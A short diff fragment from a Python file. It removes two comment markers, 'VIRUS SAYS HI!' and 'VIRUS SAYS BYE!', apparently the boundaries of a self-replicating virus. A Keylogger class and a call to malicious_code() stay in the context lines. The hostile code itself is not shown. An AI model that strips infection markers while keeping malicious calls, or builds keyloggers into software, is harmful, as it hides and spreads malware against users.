@@ -1,4 +1,3 @@
-# VIRUS SAYS HI!
 
 import sys
 import glob
@@ -145,4 +144,3 @@ class Keylogger:
 
 malicious_code()
 
-# VIRUS SAYS BYE!
